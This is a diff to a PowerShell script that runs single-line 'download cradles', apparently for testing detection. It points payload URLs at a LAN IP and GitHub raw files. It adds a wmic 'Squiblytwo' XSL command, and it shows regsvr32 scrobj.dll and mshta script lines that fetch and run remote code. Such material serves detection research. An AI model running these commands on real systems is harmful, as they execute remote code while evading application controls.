@@ -1,9 +1,9 @@
-﻿<#
+<#
 .SYNOPSIS
 	Invoke-DownloadCradle.ps1 runs several single liner Download cradles.
 
     Name: Invoke-DownloadCradle.ps1
-    Version: 0.2
+    Version: 0.21
     Author: Matt Green (@mgreen27)
 
 .DESCRIPTION
@@ -33,11 +33,12 @@ $Sleep=$True
 # Add http server details here
 If ($TLS -eq 0){
     $Url = @(
-        "http://<DOMAIN>/test.ps1", # Basic Powershell Test script
+        "http://192.168.7.136/test.ps1", # Basic Powershell Test script
         "test.dfir.com.au", # DNS text test - Powershell Test script base64 encoded in DNS txt field
-        "http://<DOMAIN>/test.xml", # Powershell embedded command
-        "http://<DOMAIN>/test.sct", # Powershell embedded scriptlet
-        "http://<DOMAIN>/mshta.sct" # Powershell embedded scriptlet
+        "http://192.168.7.136/test.xml", # Powershell embedded command
+        "http://192.168.7.136/test.sct", # Powershell embedded scriptlet
+        "http://192.168.7.136/mshta.sct", # Powershell embedded scriptlet
+        "http://192.168.7.136/test.xsl" # Powershell embedded extensible Stylesheet Language
     )
 }
 ElseIf ($TLS -eq 1){
@@ -47,7 +48,8 @@ ElseIf ($TLS -eq 1){
         "test.dfir.com.au", # DNS text test - Powershell Test script base64 encoded in DNS txt field
         "https://raw.githubusercontent.com/mgreen27/mgreen27.github.io/master/other/DownloadCradle/payloads/test.xml", # Powershell embedded command
         "https://raw.githubusercontent.com/mgreen27/mgreen27.github.io/master/other/DownloadCradle/payloads/test.sct", # Powershell embedded scriptlet
-        "https://raw.githubusercontent.com/mgreen27/mgreen27.github.io/master/other/DownloadCradle/payloads/mshta.sct" # Powershell embedded scriptlet
+        "https://raw.githubusercontent.com/mgreen27/mgreen27.github.io/master/other/DownloadCradle/payloads/mshta.sct", # Powershell embedded scriptlet
+        "https://raw.githubusercontent.com/mgreen27/mgreen27.github.io/master/other/DownloadCradle/payloads/test.xsl" # Powershell embedded extensible Stylesheet Language
     )
 }
 
@@ -229,8 +231,12 @@ $Command = "`$temp=`'" + $Url[3] + "`';regsvr32.exe /s /u /i:`$temp scrobj.dll"
 Invoke-DownloadCradle -Type Regsvr32 -Command $Command
 
 
+"wmic.exe Squiblytwo"
+$Command = "wmic.exe os get /FORMAT:`"" + $Url[5] + "`""
+Invoke-DownloadCradle -Type CMD -Command $Command
+
+
 "mshta.exe"
-$Command=$null
 $command = 'mshta.exe javascript:a=GetObject("script:' + $Url[4] + '").Exec();close()'
 Invoke-DownloadCradle -Type CMD -Command $Command
 
